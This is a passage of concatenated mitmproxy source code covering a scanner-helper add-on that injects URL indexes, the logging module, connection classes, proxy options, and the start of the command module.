def loads(cls, json_str: str, value_loader: Callable = f_id):\n        json_obj = json.loads(json_str)\n        return cls._load(json_obj, value_loader)\n\n    def _dump(self, value_dumper: Callable = f_id) -> dict:\n        dumped: dict[flowfilter.TFilter | str, Any] = {}\n        for fltr, value in self.store.items():\n            if hasattr(fltr, \"pattern\"):\n                # cast necessary for mypy\n                dumped[cast(Any, fltr).pattern] = value_dumper(value)\n            else:\n                dumped[str(fltr)] = value_dumper(value)\n        return dumped\n\n    def dump(self, f: TextIO, value_dumper: Callable = f_id):\n        json.dump(self._dump(value_dumper), f)\n\n    def dumps(self, value_dumper: Callable = f_id):\n        return json.dumps(self._dump(value_dumper))\n", "examples/contrib/webscanner_helper/urlinjection.py": "import abc\nimport html\nimport json\nimport logging\n\nfrom mitmproxy import flowfilter\nfrom mitmproxy.http import HTTPFlow\n\nlogger = logging.getLogger(__name__)\n\n\nclass InjectionGenerator:\n    \"\"\"Abstract class for an generator of the injection content in order to inject the URL index.\"\"\"\n\n    ENCODING = \"UTF8\"\n\n    @abc.abstractmethod\n    def inject(self, index, flow: HTTPFlow):\n        \"\"\"Injects the given URL index into the given flow.\"\"\"\n\n\nclass HTMLInjection(InjectionGenerator):\n    \"\"\"Injects the URL index either by creating a new HTML page or by appending is to an existing page.\"\"\"\n\n    def __init__(self, insert: bool = False):\n        \"\"\"Initializes the HTMLInjection.\n\n        Args:\n            insert: boolean to decide whether to insert the URL index to an existing page (True) or to create a new\n                page containing the URL index.\n        \"\"\"\n        self.insert = insert\n\n    @classmethod\n    def _form_html(cls, url):\n        return f'<form action=\"{url}\" method=\"POST\"></form>'\n\n    @classmethod\n    def _link_html(cls, url):\n        return f'<a href=\"{url}\">link to {url}</a>'\n\n    @classmethod\n    def index_html(cls, index):\n        link_htmls = []\n        for scheme_netloc, paths in index.items():\n            for path, methods in paths.items():\n                url = scheme_netloc + path\n                if \"POST\" in methods:\n                    link_htmls.append(cls._form_html(url))\n\n                if \"GET\" in methods:\n                    link_htmls.append(cls._link_html(url))\n        return \"</ br>\".join(link_htmls)\n\n    @classmethod\n    def landing_page(cls, index):\n        return (\n            '<head><meta charset=\"UTF-8\"></head><body>'\n            + cls.index_html(index)\n            + \"</body>\"\n        )\n\n    def inject(self, index, flow: HTTPFlow):\n        if flow.response is not None:\n            if flow.response.status_code != 404 and not self.insert:\n                logger.warning(\n                    f\"URL '{flow.request.url}' didn't return 404 status, \"\n                    f\"index page would overwrite valid page.\"\n                )\n            elif self.insert:\n                content = flow.response.content.decode(\n                    self.ENCODING, \"backslashreplace\"\n                )\n                if \"</body>\" in content:\n                    content = content.replace(\n                        \"</body>\", self.index_html(index) + \"</body>\"\n                    )\n                else:\n                    content += self.index_html(index)\n                flow.response.content = content.encode(self.ENCODING)\n            else:\n                flow.response.content = self.landing_page(index).encode(self.ENCODING)\n\n\nclass RobotsInjection(InjectionGenerator):\n    \"\"\"Injects the URL index by creating a new robots.txt including the URLs.\"\"\"\n\n    def __init__(self, directive=\"Allow\"):\n        self.directive = directive\n\n    @classmethod\n    def robots_txt(cls, index, directive=\"Allow\"):\n        lines = [\"User-agent: *\"]\n        for scheme_netloc, paths in index.items():\n            for path, methods in paths.items():\n                lines.append(directive + \": \" + path)\n        return \"\\n\".join(lines)\n\n    def inject(self, index, flow: HTTPFlow):\n        if flow.response is not None:\n            if flow.response.status_code != 404:\n                logger.warning(\n                    f\"URL '{flow.request.url}' didn't return 404 status, \"\n                    f\"index page would overwrite valid page.\"\n                )\n            else:\n                flow.response.content = self.robots_txt(index, self.directive).encode(\n                    self.ENCODING\n                )\n\n\nclass SitemapInjection(InjectionGenerator):\n    \"\"\"Injects the URL index by creating a new sitemap including the URLs.\"\"\"\n\n    @classmethod\n    def sitemap(cls, index):\n        lines = [\n            '<?xml version=\"1.0\" encoding=\"UTF-8\"?><urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">'\n        ]\n        for scheme_netloc, paths in index.items():\n            for path, methods in paths.items():\n                url = scheme_netloc + path\n                lines.append(f\"<url><loc>{html.escape(url)}</loc></url>\")\n        lines.append(\"</urlset>\")\n        return \"\\n\".join(lines)\n\n    def inject(self, index, flow: HTTPFlow):\n        if flow.response is not None:\n            if flow.response.status_code != 404:\n                logger.warning(\n                    f\"URL '{flow.request.url}' didn't return 404 status, \"\n                    f\"index page would overwrite valid page.\"\n                )\n            else:\n                flow.response.content = self.sitemap(index).encode(self.ENCODING)\n\n\nclass UrlInjectionAddon:\n    \"\"\"The UrlInjection add-on can be used in combination with web application scanners to improve their crawling\n    performance.\n\n    The given URls will be injected into the web application. With this, web application scanners can find pages to\n    crawl much easier. Depending on the Injection generator, the URLs will be injected at different places of the\n    web application. It is possible to create a landing page which includes the URL (HTMLInjection()), to inject the\n    URLs to an existing page (HTMLInjection(insert=True)), to create a robots.txt containing the URLs\n    (RobotsInjection()) or to create a sitemap.xml which includes the URLS (SitemapInjection()).\n    It is necessary that the web application scanner can find the newly created page containing the URL index. For\n    example, the newly created page can be set as starting point for the web application scanner.\n    The URL index needed for the injection can be generated by the UrlIndex Add-on.\n    \"\"\"\n\n    def __init__(\n        self, flt: str, url_index_file: str, injection_gen: InjectionGenerator\n    ):\n        \"\"\"Initializes the UrlIndex add-on.\n\n        Args:\n            flt: mitmproxy filter to decide on which pages the URLs will be injected (str).\n            url_index_file: Path to the file which includes the URL index in JSON format (e.g. generated by the UrlIndexAddon), given\n                as str.\n            injection_gen: InjectionGenerator that should be used to inject the URLs into the web application.\n        \"\"\"\n        self.name = f\"{self.__class__.__name__}-{injection_gen.__class__.__name__}-{self.__hash__()}\"\n        self.flt = flowfilter.parse(flt)\n        self.injection_gen = injection_gen\n        with open(url_index_file) as f:\n            self.url_store = json.load(f)\n\n    def response(self, flow: HTTPFlow):\n        \"\"\"Checks if the response matches the filter and such should be injected.\n        Injects the URL index if appropriate.\n        \"\"\"\n        if flow.response is not None:\n            if self.flt is not None and self.flt(flow):\n                self.injection_gen.inject(self.url_store, flow)\n                flow.response.status_code = 200\n                flow.response.headers[\"content-type\"] = \"text/html\"\n                logger.debug(\n                    f\"Set status code to 200 and set content to logged \"\n                    f\"urls. Method: {self.injection_gen}\"\n                )\n", "examples/contrib/webscanner_helper/__init__.py": "", "mitmproxy/log.py": "from __future__ import annotations\n\nimport logging\nimport os\nimport typing\nimport warnings\nfrom dataclasses import dataclass\n\nfrom mitmproxy import hooks\nfrom mitmproxy.contrib import click as miniclick\nfrom mitmproxy.utils import human\n\nif typing.TYPE_CHECKING:\n    from mitmproxy import master\n\nALERT = logging.INFO + 1\n\"\"\"\nThe ALERT logging level has the same urgency as info, but\nsignals to interactive tools that the user's attention should be\ndrawn to the output even if they're not currently looking at the\nevent log.\n\"\"\"\nlogging.addLevelName(ALERT, \"ALERT\")\n\nLogLevels = [\n    \"error\",\n    \"warn\",\n    \"info\",\n    \"alert\",\n    \"debug\",\n]\n\nLOG_COLORS = {logging.ERROR: \"red\", logging.WARNING: \"yellow\", ALERT: \"magenta\"}\n\n\nclass MitmFormatter(logging.Formatter):\n    def __init__(self, colorize: bool):\n        super().__init__()\n        self.colorize = colorize\n        time = \"[%s]\"\n        client = \"[%s]\"\n        if colorize:\n            time = miniclick.style(time, fg=\"cyan\", dim=True)\n            client = miniclick.style(client, fg=\"yellow\", dim=True)\n\n        self.with_client = f\"{time}{client} %s\"\n        self.without_client = f\"{time} %s\"\n\n    default_time_format = \"%H:%M:%S\"\n    default_msec_format = \"%s.%03d\"\n\n    def format(self, record: logging.LogRecord) -> str:\n        time = self.formatTime(record)\n        message = record.getMessage()\n        if record.exc_info:\n            message = f\"{message}\\n{self.formatException(record.exc_info)}\"\n        if self.colorize:\n            message = miniclick.style(\n                message,\n                fg=LOG_COLORS.get(record.levelno),\n                # dim=(record.levelno <= logging.DEBUG)\n            )\n        if client := getattr(record, \"client\", None):\n            client = human.format_address(client)\n            return self.with_client % (time, client, message)\n        else:\n            return self.without_client % (time, message)\n\n\nclass MitmLogHandler(logging.Handler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self._initiated_in_test = os.environ.get(\"PYTEST_CURRENT_TEST\")\n\n    def filter(self, record: logging.LogRecord) -> bool:\n        # We can't remove stale handlers here because that would modify .handlers during iteration!\n        return bool(\n            super().filter(record)\n            and (\n                not self._initiated_in_test\n                or self._initiated_in_test == os.environ.get(\"PYTEST_CURRENT_TEST\")\n            )\n        )\n\n    def install(self) -> None:\n        if self._initiated_in_test:\n            for h in list(logging.getLogger().handlers):\n                if (\n                    isinstance(h, MitmLogHandler)\n                    and h._initiated_in_test != self._initiated_in_test\n                ):\n                    h.uninstall()\n\n        logging.getLogger().addHandler(self)\n\n    def uninstall(self) -> None:\n        logging.getLogger().removeHandler(self)\n\n\n# everything below is deprecated!\n\n\nclass LogEntry:\n    def __init__(self, msg, level):\n        # it's important that we serialize to string here already so that we don't pick up changes\n        # happening after this log statement.\n        self.msg = str(msg)\n        self.level = level\n\n    def __eq__(self, other):\n        if isinstance(other, LogEntry):\n            return self.__dict__ == other.__dict__\n        return False\n\n    def __repr__(self):\n        return f\"LogEntry({self.msg}, {self.level})\"\n\n\nclass Log:\n    \"\"\"\n    The central logger, exposed to scripts as mitmproxy.ctx.log.\n\n    Deprecated: Please use the standard Python logging module instead.\n    \"\"\"\n\n    def __init__(self, master):\n        self.master = master\n\n    def debug(self, txt):\n        \"\"\"\n        Log with level debug.\n        \"\"\"\n        warnings.warn(\n            \"mitmproxy's ctx.log.debug() is deprecated. Please use the standard Python logging module instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        logging.getLogger().debug(txt)\n\n    def info(self, txt):\n        \"\"\"\n        Log with level info.\n        \"\"\"\n        warnings.warn(\n            \"mitmproxy's ctx.log.info() is deprecated. Please use the standard Python logging module instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        logging.getLogger().info(txt)\n\n    def alert(self, txt):\n        \"\"\"\n        Log with level alert. Alerts have the same urgency as info, but\n        signals to interactive tools that the user's attention should be\n        drawn to the output even if they're not currently looking at the\n        event log.\n        \"\"\"\n        warnings.warn(\n            \"mitmproxy's ctx.log.alert() is deprecated. Please use the standard Python logging module instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        logging.getLogger().log(ALERT, txt)\n\n    def warn(self, txt):\n        \"\"\"\n        Log with level warn.\n        \"\"\"\n        warnings.warn(\n            \"mitmproxy's ctx.log.warn() is deprecated. Please use the standard Python logging module instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        logging.getLogger().warning(txt)\n\n    def error(self, txt):\n        \"\"\"\n        Log with level error.\n        \"\"\"\n        warnings.warn(\n            \"mitmproxy's ctx.log.error() is deprecated. Please use the standard Python logging module instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        logging.getLogger().error(txt)\n\n    def __call__(self, text, level=\"info\"):\n        warnings.warn(\n            \"mitmproxy's ctx.log() is deprecated. Please use the standard Python logging module instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        logging.getLogger().log(level=logging.getLevelName(level.upper()), msg=text)\n\n\nLOGGING_LEVELS_TO_LOGENTRY = {\n    logging.ERROR: \"error\",\n    logging.WARNING: \"warn\",\n    logging.INFO: \"info\",\n    ALERT: \"alert\",\n    logging.DEBUG: \"debug\",\n}\n\n\nclass LegacyLogEvents(MitmLogHandler):\n    \"\"\"Emit deprecated `add_log` events from stdlib logging.\"\"\"\n\n    def __init__(\n        self,\n        master: master.Master,\n    ):\n        super().__init__()\n        self.master = master\n        self.formatter = MitmFormatter(colorize=False)\n\n    def emit(self, record: logging.LogRecord) -> None:\n        entry = LogEntry(\n            msg=self.format(record),\n            level=LOGGING_LEVELS_TO_LOGENTRY.get(record.levelno, \"error\"),\n        )\n        self.master.event_loop.call_soon_threadsafe(\n            self.master.addons.trigger,\n            AddLogHook(entry),\n        )\n\n\n@dataclass\nclass AddLogHook(hooks.Hook):\n    \"\"\"\n    **Deprecated:** Starting with mitmproxy 9, users should use the standard Python logging module instead, for example\n    by calling `logging.getLogger().addHandler()`.\n\n    Called whenever a new log entry is created through the mitmproxy\n    context. Be careful not to log from this event, which will cause an\n    infinite loop!\n    \"\"\"\n\n    entry: LogEntry\n\n\ndef log_tier(level):\n    \"\"\"\n    Comparison method for \"old\" LogEntry log tiers.\n    Ideally you should use the standard Python logging module instead.\n    \"\"\"\n    return dict(error=0, warn=1, info=2, alert=2, debug=3).get(level)\n", "mitmproxy/connection.py": "import dataclasses\nimport time\nimport uuid\nimport warnings\nfrom abc import ABCMeta\nfrom collections.abc import Sequence\nfrom dataclasses import dataclass\nfrom dataclasses import field\nfrom enum import Flag\nfrom typing import Literal\n\nfrom mitmproxy import certs\nfrom mitmproxy.coretypes import serializable\nfrom mitmproxy.net import server_spec\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.utils import human\n\n\nclass ConnectionState(Flag):\n    \"\"\"The current state of the underlying socket.\"\"\"\n\n    CLOSED = 0\n    CAN_READ = 1\n    CAN_WRITE = 2\n    OPEN = CAN_READ | CAN_WRITE\n\n\nTransportProtocol = Literal[\"tcp\", \"udp\"]\n\n\n# practically speaking we may have IPv6 addresses with flowinfo and scope_id,\n# but type checking isn't good enough to properly handle tuple unions.\n# this version at least provides useful type checking messages.\nAddress = tuple[str, int]\n\nkw_only = {\"kw_only\": True}\n\n\n# noinspection PyDataclass\n@dataclass(**kw_only)\nclass Connection(serializable.SerializableDataclass, metaclass=ABCMeta):\n    \"\"\"\n    Base class for client and server connections.\n\n    The connection object only exposes metadata about the connection, but not the underlying socket object.\n    This is intentional, all I/O should be handled by `mitmproxy.proxy.server` exclusively.\n    \"\"\"\n\n    peername: Address | None\n    \"\"\"The remote's `(ip, port)` tuple for this connection.\"\"\"\n    sockname: Address | None\n    \"\"\"Our local `(ip, port)` tuple for this connection.\"\"\"\n\n    state: ConnectionState = field(\n        default=ConnectionState.CLOSED, metadata={\"serialize\": False}\n    )\n    \"\"\"The current connection state.\"\"\"\n\n    # all connections have a unique id. While\n    # f.client_conn == f2.client_conn already holds true for live flows (where we have object identity),\n    # we also want these semantics for recorded flows.\n    id: str = field(default_factory=lambda: str(uuid.uuid4()))\n    \"\"\"A unique UUID to identify the connection.\"\"\"\n    transport_protocol: TransportProtocol = field(default=\"tcp\")\n    \"\"\"The connection protocol in use.\"\"\"\n    error: str | None = None\n    \"\"\"\n    A string describing a general error with connections to this address.\n\n    The purpose of this property is to signal that new connections to the particular endpoint should not be attempted,\n    for example because it uses an untrusted TLS certificate. Regular (unexpected) disconnects do not set the error\n    property. This property is only reused per client connection.\n    \"\"\"\n\n    tls: bool = False\n    \"\"\"\n    `True` if TLS should be established, `False` otherwise.\n    Note that this property only describes if a connection should eventually be protected using TLS.\n    To check if TLS has already been established, use `Connection.tls_established`.\n    \"\"\"\n    certificate_list: Sequence[certs.Cert] = ()\n    \"\"\"\n    The TLS certificate list as sent by the peer.\n    The first certificate is the end-entity certificate.\n\n    > [RFC 8446] Prior to TLS 1.3, \"certificate_list\" ordering required each\n    > certificate to certify the one immediately preceding it; however,\n    > some implementations allowed some flexibility.  Servers sometimes\n    > send both a current and deprecated intermediate for transitional\n    > purposes, and others are simply configured incorrectly, but these\n    > cases can nonetheless be validated properly.  For maximum\n    > compatibility, all implementations SHOULD be prepared to handle\n    > potentially extraneous certificates and arbitrary orderings from any\n    > TLS version, with the exception of the end-entity certificate which\n    > MUST be first.\n    \"\"\"\n    alpn: bytes | None = None\n    \"\"\"The application-layer protocol as negotiated using\n    [ALPN](https://en.wikipedia.org/wiki/Application-Layer_Protocol_Negotiation).\"\"\"\n    alpn_offers: Sequence[bytes] = ()\n    \"\"\"The ALPN offers as sent in the ClientHello.\"\"\"\n    # we may want to add SSL_CIPHER_description here, but that's currently not exposed by cryptography\n    cipher: str | None = None\n    \"\"\"The active cipher name as returned by OpenSSL's `SSL_CIPHER_get_name`.\"\"\"\n    cipher_list: Sequence[str] = ()\n    \"\"\"Ciphers accepted by the proxy server on this connection.\"\"\"\n    tls_version: str | None = None\n    \"\"\"The active TLS version.\"\"\"\n    sni: str | None = None\n    \"\"\"\n    The [Server Name Indication (SNI)](https://en.wikipedia.org/wiki/Server_Name_Indication) sent in the ClientHello.\n    \"\"\"\n\n    timestamp_start: float | None = None\n    timestamp_end: float | None = None\n    \"\"\"*Timestamp:* Connection has been closed.\"\"\"\n    timestamp_tls_setup: float | None = None\n    \"\"\"*Timestamp:* TLS handshake has been completed successfully.\"\"\"\n\n    @property\n    def connected(self) -> bool:\n        \"\"\"*Read-only:* `True` if Connection.state is ConnectionState.OPEN, `False` otherwise.\"\"\"\n        return self.state is ConnectionState.OPEN\n\n    @property\n    def tls_established(self) -> bool:\n        \"\"\"*Read-only:* `True` if TLS has been established, `False` otherwise.\"\"\"\n        return self.timestamp_tls_setup is not None\n\n    def __eq__(self, other):\n        if isinstance(other, Connection):\n            return self.id == other.id\n        return False\n\n    def __hash__(self):\n        return hash(self.id)\n\n    def __repr__(self):\n        attrs = {\n            # ensure these come first.\n            \"id\": None,\n            \"address\": None,\n        }\n        for f in dataclasses.fields(self):\n            val = getattr(self, f.name)\n            if val != f.default:\n                if f.name == \"cipher_list\":\n                    val = f\"<{len(val)} ciphers>\"\n                elif f.name == \"id\":\n                    val = f\"\u2026{val[-6:]}\"\n                attrs[f.name] = val\n        return f\"{type(self).__name__}({attrs!r})\"\n\n    @property\n    def alpn_proto_negotiated(self) -> bytes | None:  # pragma: no cover\n        \"\"\"*Deprecated:* An outdated alias for Connection.alpn.\"\"\"\n        warnings.warn(\n            \"Connection.alpn_proto_negotiated is deprecated, use Connection.alpn instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        return self.alpn\n\n\n# noinspection PyDataclass\n@dataclass(eq=False, repr=False, **kw_only)\nclass Client(Connection):\n    \"\"\"A connection between a client and mitmproxy.\"\"\"\n\n    peername: Address\n    \"\"\"The client's address.\"\"\"\n    sockname: Address\n    \"\"\"The local address we received this connection on.\"\"\"\n\n    mitmcert: certs.Cert | None = None\n    \"\"\"\n    The certificate used by mitmproxy to establish TLS with the client.\n    \"\"\"\n\n    proxy_mode: mode_specs.ProxyMode = field(\n        default=mode_specs.ProxyMode.parse(\"regular\")\n    )\n    \"\"\"The proxy server type this client has been connecting to.\"\"\"\n\n    timestamp_start: float = field(default_factory=time.time)\n    \"\"\"*Timestamp:* TCP SYN received\"\"\"\n\n    def __str__(self):\n        if self.alpn:\n            tls_state = f\", alpn={self.alpn.decode(errors='replace')}\"\n        elif self.tls_established:\n            tls_state = \", tls\"\n        else:\n            tls_state = \"\"\n        state = self.state.name\n        assert state\n        return f\"Client({human.format_address(self.peername)}, state={state.lower()}{tls_state})\"\n\n    @property\n    def address(self):  # pragma: no cover\n        \"\"\"*Deprecated:* An outdated alias for Client.peername.\"\"\"\n        warnings.warn(\n            \"Client.address is deprecated, use Client.peername instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        return self.peername\n\n    @address.setter\n    def address(self, x):  # pragma: no cover\n        warnings.warn(\n            \"Client.address is deprecated, use Client.peername instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        self.peername = x\n\n    @property\n    def cipher_name(self) -> str | None:  # pragma: no cover\n        \"\"\"*Deprecated:* An outdated alias for Connection.cipher.\"\"\"\n        warnings.warn(\n            \"Client.cipher_name is deprecated, use Client.cipher instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        return self.cipher\n\n    @property\n    def clientcert(self) -> certs.Cert | None:  # pragma: no cover\n        \"\"\"*Deprecated:* An outdated alias for Connection.certificate_list[0].\"\"\"\n        warnings.warn(\n            \"Client.clientcert is deprecated, use Client.certificate_list instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        if self.certificate_list:\n            return self.certificate_list[0]\n        else:\n            return None\n\n    @clientcert.setter\n    def clientcert(self, val):  # pragma: no cover\n        warnings.warn(\n            \"Client.clientcert is deprecated, use Client.certificate_list instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        if val:\n            self.certificate_list = [val]\n        else:\n            self.certificate_list = []\n\n\n# noinspection PyDataclass\n@dataclass(eq=False, repr=False, **kw_only)\nclass Server(Connection):\n    \"\"\"A connection between mitmproxy and an upstream server.\"\"\"\n\n    address: Address | None  # type: ignore\n    \"\"\"\n    The server's `(host, port)` address tuple.\n\n    The host can either be a domain or a plain IP address.\n    Which of those two will be present depends on the proxy mode and the client.\n    For explicit proxies, this value will reflect what the client instructs mitmproxy to connect to.\n    For example, if the client starts off a connection with `CONNECT example.com HTTP/1.1`, it will be `example.com`.\n    For transparent proxies such as WireGuard mode, this value will be an IP address.\n    \"\"\"\n\n    peername: Address | None = None\n    \"\"\"\n    The server's resolved `(ip, port)` tuple. Will be set during connection establishment.\n    May be `None` in upstream proxy mode when the address is resolved by the upstream proxy only.\n    \"\"\"\n    sockname: Address | None = None\n\n    timestamp_start: float | None = None\n    \"\"\"\n    *Timestamp:* Connection establishment started.\n\n    For IP addresses, this corresponds to sending a TCP SYN; for domains, this corresponds to starting a DNS lookup.\n    \"\"\"\n    timestamp_tcp_setup: float | None = None\n    \"\"\"*Timestamp:* TCP ACK received.\"\"\"\n\n    via: server_spec.ServerSpec | None = None\n    \"\"\"An optional proxy server specification via which the connection should be established.\"\"\"\n\n    def __str__(self):\n        if self.alpn:\n            tls_state = f\", alpn={self.alpn.decode(errors='replace')}\"\n        elif self.tls_established:\n            tls_state = \", tls\"\n        else:\n            tls_state = \"\"\n        if self.sockname:\n            local_port = f\", src_port={self.sockname[1]}\"\n        else:\n            local_port = \"\"\n        state = self.state.name\n        assert state\n        return f\"Server({human.format_address(self.address)}, state={state.lower()}{tls_state}{local_port})\"\n\n    def __setattr__(self, name, value):\n        if name in (\"address\", \"via\"):\n            connection_open = (\n                self.__dict__.get(\"state\", ConnectionState.CLOSED)\n                is ConnectionState.OPEN\n            )\n            # assigning the current value is okay, that may be an artifact of calling .set_state().\n            attr_changed = self.__dict__.get(name) != value\n            if connection_open and attr_changed:\n                raise RuntimeError(f\"Cannot change server.{name} on open connection.\")\n        return super().__setattr__(name, value)\n\n    @property\n    def ip_address(self) -> Address | None:  # pragma: no cover\n        \"\"\"*Deprecated:* An outdated alias for `Server.peername`.\"\"\"\n        warnings.warn(\n            \"Server.ip_address is deprecated, use Server.peername instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        return self.peername\n\n    @property\n    def cert(self) -> certs.Cert | None:  # pragma: no cover\n        \"\"\"*Deprecated:* An outdated alias for `Connection.certificate_list[0]`.\"\"\"\n        warnings.warn(\n            \"Server.cert is deprecated, use Server.certificate_list instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        if self.certificate_list:\n            return self.certificate_list[0]\n        else:\n            return None\n\n    @cert.setter\n    def cert(self, val):  # pragma: no cover\n        warnings.warn(\n            \"Server.cert is deprecated, use Server.certificate_list instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        if val:\n            self.certificate_list = [val]\n        else:\n            self.certificate_list = []\n\n\n__all__ = [\"Connection\", \"Client\", \"Server\", \"ConnectionState\"]\n", "mitmproxy/options.py": "from collections.abc import Sequence\nfrom typing import Optional\n\nfrom mitmproxy import optmanager\n\nCONF_DIR = \"~/.mitmproxy\"\nCONF_BASENAME = \"mitmproxy\"\nCONTENT_VIEW_LINES_CUTOFF = 512\nKEY_SIZE = 2048\n\n\nclass Options(optmanager.OptManager):\n    def __init__(self, **kwargs) -> None:\n        super().__init__()\n        self.add_option(\n            \"server\", bool, True, \"Start a proxy server. Enabled by default.\"\n        )\n        self.add_option(\n            \"showhost\",\n            bool,\n            False,\n            \"Use the Host header to construct URLs for display.\",\n        )\n\n        # Proxy options\n        self.add_option(\n            \"add_upstream_certs_to_client_chain\",\n            bool,\n            False,\n            \"\"\"\n            Add all certificates of the upstream server to the certificate chain\n            that will be served to the proxy client, as extras.\n            \"\"\",\n        )\n        self.add_option(\n            \"confdir\",\n            str,\n            CONF_DIR,\n            \"Location of the default mitmproxy configuration files.\",\n        )\n        self.add_option(\n            \"certs\",\n            Sequence[str],\n            [],\n            \"\"\"\n            SSL certificates of the form \"[domain=]path\". The domain may include\n            a wildcard, and is equal to \"*\" if not specified. The file at path\n            is a certificate in PEM format. If a private key is included in the\n            PEM, it is used, else the default key in the conf dir is used. The\n            PEM file should contain the full certificate chain, with the leaf\n            certificate as the first entry.\n            \"\"\",\n        )\n        self.add_option(\n            \"cert_passphrase\",\n            Optional[str],\n            None,\n            \"\"\"\n            Passphrase for decrypting the private key provided in the --cert option.\n\n            Note that passing cert_passphrase on the command line makes your passphrase visible in your system's\n            process list. Specify it in config.yaml to avoid this.\n            \"\"\",\n        )\n        self.add_option(\n            \"ciphers_client\",\n            Optional[str],\n            None,\n            \"Set supported ciphers for client <-> mitmproxy connections using OpenSSL syntax.\",\n        )\n        self.add_option(\n            \"ciphers_server\",\n            Optional[str],\n            None,\n            \"Set supported ciphers for mitmproxy <-> server connections using OpenSSL syntax.\",\n        )\n        self.add_option(\n            \"client_certs\", Optional[str], None, \"Client certificate file or directory.\"\n        )\n        self.add_option(\n            \"ignore_hosts\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Ignore host and forward all traffic without processing it. In\n            transparent mode, it is recommended to use an IP address (range),\n            not the hostname. In regular mode, only SSL traffic is ignored and\n            the hostname should be used. The supplied value is interpreted as a\n            regular expression and matched on the ip or the hostname.\n            \"\"\",\n        )\n        self.add_option(\"allow_hosts\", Sequence[str], [], \"Opposite of --ignore-hosts.\")\n        self.add_option(\n            \"listen_host\",\n            str,\n            \"\",\n            \"Address to bind proxy server(s) to (may be overridden for individual modes, see `mode`).\",\n        )\n        self.add_option(\n            \"listen_port\",\n            Optional[int],\n            None,\n            \"Port to bind proxy server(s) to (may be overridden for individual modes, see `mode`). \"\n            \"By default, the port is mode-specific. The default regular HTTP proxy spawns on port 8080.\",\n        )\n        self.add_option(\n            \"mode\",\n            Sequence[str],\n            [\"regular\"],\n            \"\"\"\n            The proxy server type(s) to spawn. Can be passed multiple times.\n\n            Mitmproxy supports \"regular\" (HTTP), \"transparent\", \"socks5\", \"reverse:SPEC\",\n            \"upstream:SPEC\", and \"wireguard[:PATH]\" proxy servers. For reverse and upstream proxy modes, SPEC\n            is host specification in the form of \"http[s]://host[:port]\". For WireGuard mode, PATH may point to\n            a file containing key material. If no such file exists, it will be created on startup.\n\n            You may append `@listen_port` or `@listen_host:listen_port` to override `listen_host` or `listen_port` for\n            a specific proxy mode. Features such as client playback will use the first mode to determine\n            which upstream server to use.\n            \"\"\",\n        )\n        self.add_option(\n            \"upstream_cert\",\n            bool,\n            True,\n            \"Connect to upstream server to look up certificate details.\",\n        )\n\n        self.add_option(\n            \"http2\",\n            bool,\n            True,\n            \"Enable/disable HTTP/2 support. HTTP/2 support is enabled by default.\",\n        )\n        self.add_option(\n            \"http2_ping_keepalive\",\n            int,\n            58,\n            \"\"\"\n            Send a PING frame if an HTTP/2 connection is idle for more than\n            the specified number of seconds to prevent the remote site from closing it.\n            Set to 0 to disable this feature.\n            \"\"\",\n        )\n        self.add_option(\n            \"http3\",\n            bool,\n            True,\n            \"Enable/disable support for QUIC and HTTP/3. Enabled by default.\",\n        )\n        self.add_option(\n            \"websocket\",\n            bool,\n            True,\n            \"Enable/disable WebSocket support. \"\n            \"WebSocket support is enabled by default.\",\n        )\n        self.add_option(\n            \"rawtcp\",\n            bool,\n            True,\n            \"Enable/disable raw TCP connections. \"\n            \"TCP connections are enabled by default. \",\n        )\n        self.add_option(\n            \"ssl_insecure\",\n            bool,\n            False,\n            \"Do not verify upstream server SSL/TLS certificates.\",\n        )\n        self.add_option(\n            \"ssl_verify_upstream_trusted_confdir\",\n            Optional[str],\n            None,\n            \"\"\"\n            Path to a directory of trusted CA certificates for upstream server\n            verification prepared using the c_rehash tool.\n            \"\"\",\n        )\n        self.add_option(\n            \"ssl_verify_upstream_trusted_ca\",\n            Optional[str],\n            None,\n            \"Path to a PEM formatted trusted CA certificate.\",\n        )\n        self.add_option(\n            \"tcp_hosts\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Generic TCP SSL proxy mode for all hosts that match the pattern.\n            Similar to --ignore-hosts, but SSL connections are intercepted.\n            The communication contents are printed to the log in verbose mode.\n            \"\"\",\n        )\n        self.add_option(\n            \"udp_hosts\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Generic UDP SSL proxy mode for all hosts that match the pattern.\n            Similar to --ignore-hosts, but SSL connections are intercepted.\n            The communication contents are printed to the log in verbose mode.\n            \"\"\",\n        )\n        self.add_option(\n            \"content_view_lines_cutoff\",\n            int,\n            CONTENT_VIEW_LINES_CUTOFF,\n            \"\"\"\n            Flow content view lines limit. Limit is enabled by default to\n            speedup flows browsing.\n            \"\"\",\n        )\n        self.add_option(\n            \"key_size\",\n            int,\n            KEY_SIZE,\n            \"\"\"\n            TLS key size for certificates and CA.\n            \"\"\",\n        )\n\n        self.update(**kwargs)\n", "mitmproxy/command.py": "\"\"\"\nThis module manages and invokes typed commands.\n\"\"\"\n\nimport functools\nimport inspect\nimport logging\nimport sys\nimport textwrap\nimport types\nfrom collections.abc import Callable\nfrom collections.abc import Iterable\nfrom collections.abc import Sequence\nfrom typing import Any\nfrom typing import NamedTuple\n\nimport pyparsing\n\nimport mitmproxy.types\nfrom mitmproxy import command_lexer\nfrom mitmproxy import exceptions\nfrom mitmproxy.command_lexer import unquote\n\n\ndef verify_arg_signature(f: Callable, args: Iterable[Any], kwargs: dict) -> None:\n    sig = inspect.signature(f, eval_str=True)\n    try:\n        